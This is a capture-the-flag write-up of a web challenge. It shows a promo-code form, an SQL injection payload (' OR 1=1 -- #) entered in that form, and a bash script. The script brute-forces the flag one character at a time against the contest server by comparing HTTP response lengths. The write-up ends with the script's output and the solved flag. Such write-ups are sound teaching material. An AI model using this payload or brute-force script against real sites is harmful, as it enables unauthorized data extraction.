![image](https://github.com/user-attachments/assets/985f6e5b-3b91-4d88-abd2-7abd5a1a2024)![image](https://github.com/user-attachments/assets/3c5984df-d224-4c0a-9425-0f27a1fc3337)# Web SQL Injection One by One

We accessed the challenge and saw a checkout form with a "Promo Code" input field and this structure:

```html
<form method="POST">
  <input name="promo" type="text" class="form-control" placeholder="Promo code">
  <input type="submit" name="submit" class="btn btn-secondary" value="Redeem">
</form>
```

This hinted that the promo field might be passed directly into an SQL query on the backend, such as: *SELECT * FROM promos WHERE code = '$promo'*

We tested for SQL injection by entering the following payload into the Promo Code field:

```sql
' OR 1=1 -- #
```

The page applied a promo code: SSS{...}

The total updated with a -$20 discount

Injection confirmed! We realized the promo code itself is the flag, and it begins with SSS{, we noticed this by trying to add random chars after { and so at *d* it gave again the promo confirmed.

But we couldn't retrieve the entire flag directly — so we crafted a bash brute-force script that built the flag one character at a time, checking if the promo code is valid by comparing the HTTP response length. (little help from our friend and extra team member chatgpt :) )

```bash
#!/bin/bash

# Hardcoded target URL
url="http://ctf-15.security.cs.pub.ro:8010/"

# Character set: a-zA-Z0-9{}_
str=$(echo {a..z} {A..Z} {0..9} \{ \} _ | tr -d ' ')
insideFlag=""
expected=11085

echo "Start exploit for One by one"
echo "Target: $url"
echo "----------------------------"

while [ -n "$str" ]; do
    next=${str#?}
    char="${str%$next}"
    insideFlag=$insideFlag$char

    out=$(curl -s -d "promo=SSS$insideFlag&submit=Redeem" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -X POST "$url" | wc -c)

    if [ "$out" -eq "$expected" ]; then
        echo "✔ Match: $char   ->  SSS$insideFlag"

        # Stop if closing brace is reached
        if [[ "$char" == "}" ]]; then
            echo "✅ Closing brace detected. Flag complete."
            break
        fi

        # Reset charset
        str=$(echo {a..z} {A..Z} {0..9} \{ \} _ | tr -d ' ')
        continue
    else
        echo "❌ $char (len: $out)"
        insideFlag=${insideFlag%?}
    fi

    str=$next
done

flag="SSS$insideFlag"
echo "----------------------------"
echo "🎯 Final Flag: $flag"
```

After a lot of waiting... in the middle of the night :). The script revealed the flag character by character, and eventually returned:

```text
❌ 5 (len: 10728)
❌ 6 (len: 10728)
❌ 7 (len: 10728)
❌ 8 (len: 10728)
❌ 9 (len: 10728)
❌ { (len: 10728)
✔ Match: }   ->  SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW}
✅ Closing brace detected. Flag complete.
----------------------------
🎯 Final Flag: SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW}
```


